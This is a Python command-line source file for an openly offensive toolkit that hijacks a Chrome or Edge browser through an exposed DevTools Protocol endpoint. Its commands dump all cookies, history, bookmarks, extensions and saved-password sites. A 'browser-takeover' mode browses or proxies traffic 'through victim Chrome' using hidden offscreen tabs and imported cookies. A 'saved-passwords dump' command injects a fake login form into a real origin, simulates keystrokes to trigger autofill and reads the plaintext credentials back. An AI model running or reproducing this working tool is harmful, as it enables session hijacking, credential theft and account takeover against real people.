from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Optional

import typer
from rich.console import Console
from rich.table import Table

from .cdp_proxy import BrowseAsVictimProxyOptions, serve_browse_as_victim_proxy
from .client import CDPClient
from .discovery import get_version, list_http_targets
from .log import info, set_verbose, warn
from .redact import redact_cookies
from .remote_browser import RemoteBrowserOptions, serve_remote_browser
from .webui import collect_bookmarks, collect_extensions, collect_history, collect_password_sites

HELP_SETTINGS = {"help_option_names": ["-h", "--help"]}

app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
tabs_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
page_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
cookies_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
bookmarks_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
history_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
saved_passwords_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
extensions_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
contexts_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)
browser_takeover_app = typer.Typer(no_args_is_help=True, context_settings=HELP_SETTINGS)

app.add_typer(tabs_app, name="tabs", help="List browser tabs and capture screenshots of specified tabs.")
app.add_typer(page_app, name="page", help="Create, snapshot, and close targets.")
app.add_typer(cookies_app, name="cookies", help="Collect and export browser cookies through CDP.")
app.add_typer(bookmarks_app, name="bookmarks", help="Collect browser bookmarks/favorites through CDP-rendered WebUI.")
app.add_typer(history_app, name="history", help="Search browser history through CDP-rendered browser WebUI.")
app.add_typer(saved_passwords_app, name="saved-passwords", help="List saved-password sites and dump autofill-backed entries through CDP.")
app.add_typer(extensions_app, name="extensions", help="Inventory extensions through CDP-rendered browser WebUI.")
app.add_typer(contexts_app, name="contexts", help="List and dispose non-default browser contexts.")
app.add_typer(browser_takeover_app, name="browser-takeover", help="Browse through the CDP-attached browser using screencast or proxy mode.")

console = Console()
REQUIRED_CDP_ENDPOINT = typer.Option(
    ...,
    "--cdp-endpoint",
    "-c",
    help="Required CDP HTTP endpoint, e.g. http://127.0.0.1:9001.",
)
_ANYWHERE_VERBOSE = False


def normalize_browser_socks(proxy: str | None) -> str | None:
    if proxy and proxy.lower().startswith("socks5h://"):
        return "socks5://" + proxy[len("socks5h://") :]
    return proxy


@app.callback()
def main(
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Show informational progress on stderr."),
) -> None:
    """Python CDP toolkit for Chrome/Edge."""

    set_verbose(verbose or _ANYWHERE_VERBOSE)
    info("verbose logging enabled")


def cli() -> None:
    global _ANYWHERE_VERBOSE

    args = []
    passthrough = False
    for arg in sys.argv[1:]:
        if passthrough:
            args.append(arg)
        elif arg == "--":
            passthrough = True
            args.append(arg)
        elif arg in {"-v", "--verbose"}:
            _ANYWHERE_VERBOSE = True
        else:
            args.append(arg)
    app(args=args, prog_name=Path(sys.argv[0]).name)


def run(coro):
    return asyncio.run(coro)


def parse_listen(value: str) -> tuple[str, int]:
    host, sep, port_s = value.rpartition(":")
    if not sep or not host or not port_s:
        raise typer.BadParameter("--listen must be HOST:PORT, e.g. 127.0.0.1:8093")
    if host == "*":
        host = "0.0.0.0"
    try:
        port = int(port_s)
    except ValueError as exc:
        raise typer.BadParameter("--listen port must be an integer") from exc
    if port < 1 or port > 65535:
        raise typer.BadParameter("--listen port must be between 1 and 65535")
    return host, port


def dump_json(data, out: Optional[Path] = None) -> None:
    text = json.dumps(data, indent=2, ensure_ascii=False)
    if out:
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(text + "\n", encoding="utf-8")
        info("wrote JSON artifact {}", out)
        console.print(f"[green]wrote[/green] {out}")
    else:
        console.print_json(text)


@app.command()
def discover(
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    json_out: bool = typer.Option(False, "--json"),
) -> None:
    """Show CDP version and HTTP target discovery."""

    async def _run():
        endpoint = await get_version(cdp_endpoint, proxy=socks)
        targets = await list_http_targets(cdp_endpoint, proxy=socks)
        data = {"version": endpoint.raw, "targets": targets}
        if json_out:
            dump_json(data)
            return
        table = Table("Field", "Value")
        table.add_row("Browser", endpoint.product)
        table.add_row("Protocol", endpoint.protocol_version)
        table.add_row("User-Agent", endpoint.user_agent)
        table.add_row("WebSocket", endpoint.web_socket_debugger_url)
        table.add_row("Targets", str(len(targets)))
        console.print(table)

    run(_run())


async def resolve_target(cdp: CDPClient, target_prefix: str) -> str:
    info("resolving target prefix {}", target_prefix)
    targets_data = await cdp.targets(include_non_pages=True)
    matches = [t["targetId"] for t in targets_data if t.get("targetId", "").lower().startswith(target_prefix.lower())]
    if not matches:
        raise typer.BadParameter(f"No target matches prefix {target_prefix}")
    if len(matches) > 1:
        raise typer.BadParameter(f"Ambiguous target prefix {target_prefix}: {', '.join(m[:12] for m in matches)}")
    info("resolved target {} -> {}", target_prefix, matches[0])
    return matches[0]


def normalize_tab(target: dict, index: int) -> dict:
    return {
        "tab": index,
        "targetId": target.get("targetId"),
        "targetIdPrefix": (target.get("targetId") or "")[:12],
        "title": target.get("title") or "",
        "url": target.get("url") or "",
        "attached": target.get("attached"),
        "browserContextId": target.get("browserContextId"),
    }


async def browser_tabs(cdp: CDPClient) -> list[dict]:
    targets_data = await cdp.targets(include_non_pages=False)
    tabs = [normalize_tab(target, index) for index, target in enumerate(targets_data, start=1)]
    info("normalized {} page targets as tabs", len(tabs))
    return tabs


async def resolve_tab(cdp: CDPClient, tab_ref: str) -> dict:
    tabs = await browser_tabs(cdp)
    ref = tab_ref.strip()
    if ref.isdigit():
        index = int(ref)
        if 1 <= index <= len(tabs):
            tab = tabs[index - 1]
            info("resolved tab index {} -> {}", index, tab["targetId"])
            return tab
        raise typer.BadParameter(f"No tab index {index}; run cdptk tabs list")

    ref_l = ref.lower()
    id_matches = [tab for tab in tabs if (tab.get("targetId") or "").lower().startswith(ref_l)]
    if len(id_matches) == 1:
        info("resolved tab id prefix {} -> {}", ref, id_matches[0]["targetId"])
        return id_matches[0]
    if len(id_matches) > 1:
        raise typer.BadParameter(f"Ambiguous tab id prefix {ref}: {', '.join(tab['targetIdPrefix'] for tab in id_matches)}")

    text_matches = [
        tab
        for tab in tabs
        if ref_l in (tab.get("title") or "").lower() or ref_l in (tab.get("url") or "").lower()
    ]
    if len(text_matches) == 1:
        info("resolved tab text {} -> {}", ref, text_matches[0]["targetId"])
        return text_matches[0]
    if len(text_matches) > 1:
        raise typer.BadParameter(f"Ambiguous tab text {ref}: {', '.join(str(tab['tab']) for tab in text_matches)}")
    raise typer.BadParameter(f"No tab matches {ref}; run cdptk tabs list")


async def capture_tab_screenshot(
    cdp_endpoint: str,
    socks: str | None,
    tab_ref: str,
    out: Path | None,
    *,
    full: bool,
) -> tuple[dict, Path]:
    async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
        tab = await resolve_tab(cdp, tab_ref)
        path = out or Path(f"tab-{tab['tab']}-{tab['targetIdPrefix']}.png")
        written = await cdp.screenshot(tab["targetId"], path, full=full)
        return tab, written


@tabs_app.command("list")
def tabs_list(
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    json_out: bool = typer.Option(False, "--json"),
) -> None:
    """List browser page tabs with stable indexes for this invocation."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            return await browser_tabs(cdp)

    tabs = run(_run())
    if json_out:
        dump_json(tabs)
        return
    table = Table("#", "Target ID", "Title", "URL")
    for tab in tabs:
        table.add_row(
            str(tab["tab"]),
            tab["targetIdPrefix"],
            (tab.get("title") or "")[:60],
            tab.get("url") or "",
        )
    console.print(table)
    console.print(f"[cyan]{len(tabs)}[/cyan] tabs")


@tabs_app.command("screenshot")
def tabs_screenshot(
    tab: str = typer.Argument(..., help="Tab number from `tabs list`, target-id prefix, or unique title/URL text."),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
    full: bool = typer.Option(False, "--full"),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
) -> None:
    """Capture a screenshot of a specified tab."""

    tab_data, path = run(capture_tab_screenshot(cdp_endpoint, socks, tab, out, full=full))
    console.print(f"[green]wrote[/green] {path} from tab {tab_data['tab']} ({tab_data['targetIdPrefix']})")


@browser_takeover_app.command("screencast")
def browser_takeover_screencast(
    start_url: str = typer.Option("about:blank", "--start-url", "--url", help="Initial URL for the remote browser target."),
    listen: str = typer.Option("127.0.0.1:8093", "--listen", "-l", help="Operator web console bind address as HOST:PORT."),
    mode: str = typer.Option("offscreen", "--mode", help="offscreen, foreground, background"),
    width: int = typer.Option(1440, "--width", min=320, max=7680, help="Remote viewport/window width."),
    height: int = typer.Option(900, "--height", min=240, max=4320, help="Remote viewport/window height."),
    quality: int = typer.Option(70, "--quality", min=1, max=100, help="JPEG screencast quality."),
    every_nth_frame: int = typer.Option(1, "--every-nth-frame", min=1, max=60),
    offscreen_left: int = typer.Option(-2400, "--offscreen-left", help="Window X position for offscreen mode."),
    offscreen_top: int = typer.Option(-1200, "--offscreen-top", help="Window Y position for offscreen mode."),
    close_target: bool = typer.Option(True, "--close-target/--keep-target", help="Close the created browser target on exit."),
    import_cookies: bool = typer.Option(True, "--import-cookies/--no-import-cookies", help="Copy default cookies into proxied isolated contexts."),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    browser_socks: Optional[str] = typer.Option(None, "--browser-socks", help="SOCKS proxy for browser egress in an isolated context."),
) -> None:
    """Serve a local operator console that drives a CDP target via screencast."""

    host, port = parse_listen(listen)
    if mode not in {"offscreen", "foreground", "background"}:
        raise typer.BadParameter("--mode must be offscreen, foreground, or background")
    options = RemoteBrowserOptions(
        cdp_endpoint=cdp_endpoint,
        socks=socks,
        browser_socks=browser_socks,
        listen_host=host,
        listen_port=port,
        start_url=start_url,
        mode=mode,
        width=width,
        height=height,
        quality=quality,
        every_nth_frame=every_nth_frame,
        offscreen_left=offscreen_left,
        offscreen_top=offscreen_top,
        close_target=close_target,
        import_cookies=import_cookies,
    )
    try:
        run(serve_remote_browser(options))
    except KeyboardInterrupt:
        console.print("[cyan]stopped[/cyan]")


@browser_takeover_app.command("proxy")
def browser_takeover_proxy(
    listen: str = typer.Option("127.0.0.1:8080", "--listen", "-l", help="Operator browser proxy bind address as HOST:PORT."),
    cert_dir: Path = typer.Option(Path("runs/proxy/certs"), "--cert-dir", help="Directory for the generated CA and leaf certificates."),
    pool_size: int = typer.Option(3, "--pool-size", min=1, max=16, help="Number of hidden CDP fetch tabs."),
    fetch_timeout: float = typer.Option(20.0, "--fetch-timeout", min=1.0, max=180.0, help="Seconds to wait for each CDP-backed fetch."),
    hidden: bool = typer.Option(True, "--hidden/--background", help="Use hidden targets when supported; otherwise use background tabs."),
    subresource_loader: bool = typer.Option(
        True,
        "--subresource-loader/--navigate-subresources",
        help="Use Network.loadNetworkResource for GET/HEAD subresources to avoid victim-side downloads.",
    ),
    deny_downloads: bool = typer.Option(
        True,
        "--deny-downloads/--allow-downloads",
        help="Ask each hidden CDP fetch tab to deny browser downloads while proxying.",
    ),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
) -> None:
    """Serve a local HTTP/HTTPS proxy that fetches upstream through victim Chrome."""

    host, port = parse_listen(listen)
    options = BrowseAsVictimProxyOptions(
        cdp_endpoint=cdp_endpoint,
        socks=socks,
        listen_host=host,
        listen_port=port,
        cert_dir=cert_dir,
        pool_size=pool_size,
        fetch_timeout=fetch_timeout,
        hidden=hidden,
        subresource_loader=subresource_loader,
        deny_downloads=deny_downloads,
    )
    try:
        run(serve_browse_as_victim_proxy(options))
    except KeyboardInterrupt:
        console.print("[cyan]stopped[/cyan]")


@cookies_app.command("dump")
def cookies_dump(
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
    redact: bool = typer.Option(False, "--redact"),
) -> None:
    """Dump cookies through Storage.getCookies."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            cookies = await cdp.get_cookies()
        if domain:
            cookies = [c for c in cookies if domain.lower() in (c.get("domain") or "").lower()]
        data = redact_cookies(cookies) if redact else cookies
        dump_json(data, out)
        console.print(f"[cyan]{len(cookies)}[/cyan] cookies collected")

    run(_run())


@bookmarks_app.command("list")
def bookmarks_list(
    text: Optional[str] = typer.Argument(None),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    domain: Optional[str] = typer.Option(None, "--domain"),
    limit: int = typer.Option(1000, "--limit", "-n"),
    include_folders: bool = typer.Option(False, "--include-folders"),
    tree: bool = typer.Option(False, "--tree", help="Return the raw browser bookmark tree."),
    mode: str = typer.Option("hidden", "--mode", help="visible, background, hidden"),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
) -> None:
    """List bookmarks/favorites through CDP. Does not read profile files."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            return await collect_bookmarks(
                cdp,
                text=text,
                domain=domain,
                limit=limit,
                include_folders=include_folders,
                tree=tree,
                mode=mode,
            )

    data = run(_run())
    dump_json(data, out)
    count_label = "root nodes" if tree else "bookmark rows"
    console.print(f"[cyan]{len(data)}[/cyan] {count_label} collected through CDP")


@page_app.command("new")
def page_new(
    url: str,
    mode: str = typer.Option("visible", "--mode", help="visible, background, hidden, isolated"),
    browser_socks: Optional[str] = typer.Option(None, "--browser-socks"),
    hold: bool = typer.Option(False, "--hold", help="Keep the CDP session open. Required for useful hidden targets."),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
) -> None:
    """Create a target."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            context_id = None
            effective_browser_socks = normalize_browser_socks(browser_socks)
            if mode == "isolated" or browser_socks:
                context_id = await cdp.create_browser_context(proxy_server=effective_browser_socks, dispose_on_detach=hold)
            target_id = await cdp.create_target(url, mode=("background" if mode == "isolated" else mode), browser_context_id=context_id)
            dump_json(
                {
                    "targetId": target_id,
                    "browserContextId": context_id,
                    "mode": mode,
                    "browserSocks": browser_socks,
                    "browserSocksEffective": effective_browser_socks,
                    "held": hold,
                }
            )
            if mode == "hidden" and not hold:
                warn("hidden targets are session-lifetime only; use --hold to keep it alive")
            if context_id and not hold:
                warn("created persistent browser context; dispose with cdptk contexts dispose")
            if hold:
                console.print("[cyan]holding CDP session open; press Ctrl+C to close[/cyan]")
                try:
                    while True:
                        await asyncio.sleep(3600)
                except KeyboardInterrupt:
                    pass

    run(_run())


@contexts_app.command("list")
def contexts_list(
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
) -> None:
    """List non-default browser contexts."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            context_ids = await cdp.browser_contexts()
        dump_json({"browserContextIds": context_ids, "count": len(context_ids)})

    run(_run())


@contexts_app.command("dispose")
def contexts_dispose(
    browser_context_id: str,
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
) -> None:
    """Dispose a browser context and close its targets."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            await cdp.dispose_browser_context(browser_context_id)
        dump_json({"browserContextId": browser_context_id, "disposed": True})

    run(_run())


@page_app.command("close")
def page_close(
    target: str,
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
) -> None:
    """Close a target by id or unique prefix."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            target_id = await resolve_target(cdp, target)
            success = await cdp.close_target(target_id)
        dump_json({"targetId": target_id, "closed": success})

    run(_run())


@page_app.command("snapshot")
def page_snapshot(
    target: str,
    kind: str = typer.Option("ax", "--kind", help="ax or dom"),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
) -> None:
    """Capture an accessibility or DOM snapshot."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            target_id = await resolve_target(cdp, target)
            session = await cdp.attach(target_id)
            try:
                if kind == "ax":
                    result = await session.send("Accessibility.getFullAXTree")
                elif kind == "dom":
                    result = await session.send("DOMSnapshot.captureSnapshot", {"computedStyles": []})
                else:
                    raise typer.BadParameter("--kind must be ax or dom")
            finally:
                await cdp.detach(session)
        dump_json(result, out)

    run(_run())


@history_app.command("search")
def history_search(
    text: Optional[str] = typer.Argument(None),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    domain: Optional[str] = typer.Option(None, "--domain"),
    limit: int = typer.Option(100, "--limit", "-n"),
    mode: str = typer.Option("background", "--mode", help="visible, background, hidden"),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
) -> None:
    """Search browser History through CDP and the rendered history WebUI."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            return await collect_history(cdp, text=text, domain=domain, limit=limit, mode=mode)

    data = run(_run())
    dump_json(data, out)
    console.print(f"[cyan]{len(data)}[/cyan] history rows collected through CDP")


@saved_passwords_app.command("list")
def saved_passwords_list(
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    limit: int = typer.Option(500, "--limit", "-n"),
    mode: str = typer.Option("hidden", "--mode", help="visible, background, hidden"),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
) -> None:
    """List saved-password site metadata through CDP. Does not decrypt passwords."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            return await collect_password_sites(cdp, limit=limit, mode=mode)

    data = run(_run())
    dump_json(data, out)
    console.print(f"[cyan]{len(data)}[/cyan] saved-password site groups collected through CDP")


@saved_passwords_app.command("dump")
def saved_passwords_dump(
    origin: str = typer.Argument(..., help="Origin to test with browser autofill, e.g. https://login.example.com."),
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    mode: str = typer.Option("visible", "--mode", help="visible, background, hidden"),
    username_selector: str = typer.Option("#username", "--username-selector"),
    password_selector: str = typer.Option("#password", "--password-selector"),
    inject_form: bool = typer.Option(True, "--inject-form/--no-inject-form"),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
) -> None:
    """Attempt a controlled-form autofill readback on a real origin."""

    async def _run():
        html = """
        <!doctype html><meta charset=utf-8>
        <form>
          <input id=u name=username autocomplete=username>
          <input id=p name=password type=password autocomplete=current-password>
        </form>
        <script>document.querySelector('#u').focus();</script>
        """
        if inject_form:
            user_sel = "#u"
            pass_sel = "#p"
        else:
            user_sel = username_selector
            pass_sel = password_selector

        user_sel_js = json.dumps(user_sel)
        pass_sel_js = json.dumps(pass_sel)
        ready_expr = f"""
(() => {{
  const user = document.querySelector({user_sel_js});
  const pass = document.querySelector({pass_sel_js});
  return {{
    readyState: document.readyState,
    hasUser: !!user,
    hasPass: !!pass
  }};
}})()
"""
        pos_expr = f"""
(() => {{
  const user = document.querySelector({user_sel_js});
  const pass = document.querySelector({pass_sel_js});
  const ub = user.getBoundingClientRect();
  const pb = pass.getBoundingClientRect();
  return {{
    username_x: ub.left + ub.width / 2,
    username_y: ub.top + ub.height / 2,
    password_x: pb.left + pb.width / 2,
    password_y: pb.top + pb.height / 2,
    autocomplete_user: user.autocomplete || "",
    autocomplete_pass: pass.autocomplete || "",
    initial_username: user.value,
    initial_password: pass.value
  }};
}})()
"""
        read_expr = f"""
(() => {{
  const user = document.querySelector({user_sel_js});
  const pass = document.querySelector({pass_sel_js});
  return {{
    url: location.href,
    username: user ? user.value : "",
    password: pass ? pass.value : ""
  }};
}})()
"""

        async def value_from_eval(session, expression: str):
            result = await session.evaluate(expression)
            return result.get("result", {}).get("value")

        async def click(session, x: float, y: float) -> None:
            await session.send("Input.dispatchMouseEvent", {"type": "mouseMoved", "x": x, "y": y, "button": "none"})
            await session.send("Input.dispatchMouseEvent", {"type": "mousePressed", "x": x, "y": y, "button": "left", "clickCount": 1})
            await session.send("Input.dispatchMouseEvent", {"type": "mouseReleased", "x": x, "y": y, "button": "left", "clickCount": 1})

        async def key(session, event_type: str, key_name: str, code: str, vk: int) -> None:
            await session.send(
                "Input.dispatchKeyEvent",
                {
                    "type": event_type,
                    "key": key_name,
                    "code": code,
                    "windowsVirtualKeyCode": vk,
                    "nativeVirtualKeyCode": vk,
                },
            )

        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            target_id = await cdp.create_target(origin, mode=mode)
            session = await cdp.attach(target_id)
            try:
                await session.send("Page.enable")
                await session.send("Runtime.enable")
                await session.send("DOM.enable")
                try:
                    await session.send("Emulation.setFocusEmulationEnabled", {"enabled": True})
                except Exception as exc:
                    info(f"focus emulation unavailable: {exc}")
                await session.send("Page.navigate", {"url": origin})
                await asyncio.sleep(1.0)
                if inject_form:
                    frame_id = (await session.send("Page.getFrameTree"))["frameTree"]["frame"]["id"]
                    await session.send("Page.setDocumentContent", {"frameId": frame_id, "html": html})

                ready = False
                for _ in range(30):
                    state = await value_from_eval(session, ready_expr) or {}
                    if state.get("hasUser") and state.get("hasPass") and state.get("readyState") in {"interactive", "complete"}:
                        ready = True
                        break
                    await asyncio.sleep(0.25)
                if not ready:
                    raise typer.BadParameter("target page never exposed the requested username/password selectors")

                pos = await value_from_eval(session, pos_expr) or {}
                await click(session, float(pos["username_x"]), float(pos["username_y"]))
                await asyncio.sleep(0.5)
                await key(session, "keyDown", "ArrowDown", "ArrowDown", 40)
                await key(session, "keyUp", "ArrowDown", "ArrowDown", 40)
                await asyncio.sleep(0.2)
                await key(session, "keyDown", "Enter", "Enter", 13)
                await key(session, "keyUp", "Enter", "Enter", 13)
                await asyncio.sleep(1.0)
                result = await value_from_eval(session, read_expr) or {}
                result["autocomplete_user"] = pos.get("autocomplete_user", "")
                result["autocomplete_pass"] = pos.get("autocomplete_pass", "")
                result["initial_username"] = pos.get("initial_username", "")
                result["initial_password"] = pos.get("initial_password", "")
            finally:
                try:
                    await cdp.detach(session)
                finally:
                    await cdp.close_target(target_id)
        data = {"origin": origin, "mode": mode, "result": result}
        dump_json(data, out)

    run(_run())


@extensions_app.command("list")
def extensions_list(
    cdp_endpoint: str = REQUIRED_CDP_ENDPOINT,
    socks: Optional[str] = typer.Option(None, "--socks", help="SOCKS proxy for CDP HTTP/WebSocket control traffic."),
    mode: str = typer.Option("hidden", "--mode", help="visible, background, hidden"),
    out: Optional[Path] = typer.Option(None, "--out", "-o"),
) -> None:
    """List installed extensions through CDP and the rendered extensions WebUI."""

    async def _run():
        async with await CDPClient.connect(cdp_endpoint, socks) as cdp:
            return await collect_extensions(cdp, mode=mode)

    data = run(_run())
    dump_json(data, out)
    console.print(f"[cyan]{len(data)}[/cyan] extension rows collected through CDP")
